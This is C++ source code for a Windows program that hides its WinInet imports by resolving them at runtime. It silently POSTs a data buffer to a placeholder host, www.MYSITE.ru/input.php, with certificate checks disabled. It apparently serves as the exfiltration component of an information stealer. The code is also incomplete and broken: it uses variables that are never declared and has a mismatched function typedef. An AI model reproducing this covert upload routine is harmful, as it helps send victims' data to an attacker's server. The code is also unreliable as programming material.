#include <Windows.h>
#include <WinInet.h>

/*HttpOpenRequest*/
typedef HINTERNET(__stdcall *HORW)(
	HINTERNET hConnect,
	LPCSTR    lpszVerb,
	LPCSTR    lpszObjectName,
	LPCSTR    lpszVersion,
	LPCSTR    lpszReferrer,
	LPCSTR    *lplpszAcceptTypes,
	DWORD     dwFlags,
	DWORD_PTR dwContext
	);

/*InternetOpen*/
typedef HINTERNET(__stdcall *IOW)(
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
	);

/*HttpAddRequestHeaders*/
typedef int(__stdcall *HARHW)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	DWORD     dwModifiers
	);

/*HttpQueryInfo*/
typedef BOOL(__stdcall *HQIW)(
	HINTERNET hRequest,
	DWORD     dwInfoLevel,
	LPVOID    lpBuffer,
	LPDWORD   lpdwBufferLength,
	LPDWORD   lpdwIndex
	);

/*InternetConnect*/
typedef HINTERNET(__stdcall *ICW)(
	HINTERNET     hInternet,
	LPCSTR        lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR        lpszUserName,
	LPCSTR        lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
	);

/*HttpSendRequest*/
typedef BOOL(__stdcall *HSRW)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLength
	);

/*InternetCloseHandle*/
typedef BOOL(__stdcall *ICH)(
	HINTERNET hInternet
	);

// IOUA fInternetOpenUrl
typedef void(__stdcall *IOUA)(
	HINTERNET hInternet,
	LPCSTR    lpszUrl,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	DWORD     dwFlags,
	DWORD_PTR dwContext
	);

//IRF fInternetReadFile
typedef BOOL(__stdcall *IRF)(
	HINTERNET hFile,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
	);

HORW fHttpOpenRequest = NULL;
IOW fInternetOpen = NULL;
HARHW fHttpAddRequestHeaders = NULL;
HQIW fHttpQueryInfo = NULL;
ICW fInternetConnect = NULL;
HSRW fHttpSendRequest = NULL;
IRF fInternetReadFile = NULL;
IOUA fInternetOpenUrl = NULL;
ICH fInternetCloseHandle = NULL;

BOOL wininet() {
	WININET = LoadLibraryA("wininet.dll");
	if (WININET != NULL) {
		fHttpOpenRequest = (HORW)GetProcAddress(WININET, "HttpOpenRequestA");
		fInternetOpen = (IOW)GetProcAddress(WININET, "InternetOpenA");
		fHttpAddRequestHeaders = (HARHW)GetProcAddress(WININET, "HttpAddRequestHeadersA");
		fHttpQueryInfo = (HQIW)GetProcAddress(WININET, "HttpQueryInfoA");
		fInternetConnect = (ICW)GetProcAddress(WININET, "InternetConnectA");
		fHttpSendRequest = (HSRW)GetProcAddress(WININET, "HttpSendRequestA");
		fInternetReadFile = (IRF)GetProcAddress(WININET, "InternetReadFile");
		fInternetOpenUrl = (IOUA)GetProcAddress(WININET, "InternetOpenUrl");
		fInternetCloseHandle = (ICH)GetProcAddress(WININET, "InternetCloseHandle");
		if (fHttpOpenRequest != NULL && fInternetOpen != NULL && fHttpAddRequestHeaders != NULL && fHttpQueryInfo != NULL && fInternetConnect != NULL && fHttpSendRequest != NULL && fInternetCloseHandle != NULL) {
			return TRUE;
		}
		else return FALSE;
	}
	else return FALSE;
}

BOOL fRequestPost(LPSTR data, LPCSTR domain, LPCSTR page)
{
	HINTERNET internet = fInternetOpen("C++ POST", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	if (internet != NULL)
	{
		HINTERNET connect = fInternetConnect(internet, domain, INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
		if (connect != NULL)
		{
			HINTERNET request = fHttpOpenRequest(connect, "POST", page, "HTTP/1.1", NULL, NULL,
				INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
				INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTP | INTERNET_FLAG_IGNORE_REDIRECT_TO_HTTPS | INTERNET_FLAG_NO_AUTH |
				INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_NO_UI | INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, NULL);

			if (request != NULL)
			{
				int datalen = 0;
				if (data != NULL) datalen = strlen(data);
				LPCSTR RH = "Connection: keep-Alive\r\n";
				fHttpAddRequestHeaders(request, RH, strlen(RH), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
				LPCSTR RH1 = "Content-Type: application/json\r\n";
				fHttpAddRequestHeaders(request, RH1, strlen(RH1), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
				LPCSTR RH3 = "Accept-Language: en-US, en;q=0.8\r\n";
				fHttpAddRequestHeaders(request, RH3, strlen(RH3), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
				LPCSTR RH4 = "Accept: */*\r\n";
				fHttpAddRequestHeaders(request, RH4, strlen(RH4), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
				LPCSTR RH5 = "Accept-Encoding: gzip, deflate, sdch\r\n";
				fHttpAddRequestHeaders(request, RH5, strlen(RH5), HTTP_ADDREQ_FLAG_REPLACE | HTTP_ADDREQ_FLAG_ADD);
				fHttpSendRequest(request, NULL, 0, data, datalen);
				DWORD StatusCode = 0;
				DWORD StatusCodeLen = sizeof(StatusCode);
				fHttpQueryInfo(request, HTTP_QUERY_STATUS_CODE | HTTP_QUERY_FLAG_NUMBER, &StatusCode, &StatusCodeLen, NULL);

				if (StatusCode == 200)
				{
					fInternetCloseHandle(request);
					fInternetCloseHandle(connect);
					fInternetCloseHandle(internet);
					return TRUE;
				}
				else {
					fInternetCloseHandle(request);
					fInternetCloseHandle(connect);
					fInternetCloseHandle(internet);
					return FALSE;
				}
			}
			else {
				fInternetCloseHandle(request);
				fInternetCloseHandle(connect);
				fInternetCloseHandle(internet);
				return FALSE;
			}
		}
		else {
			fInternetCloseHandle(connect);
			fInternetCloseHandle(internet);
			return FALSE;
		}
	}
	else {
		fInternetCloseHandle(internet);
		return FALSE;
	}
}

int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    fRequestPost(infomation, "www.MYSITE.ru", "/input.php"); 
}
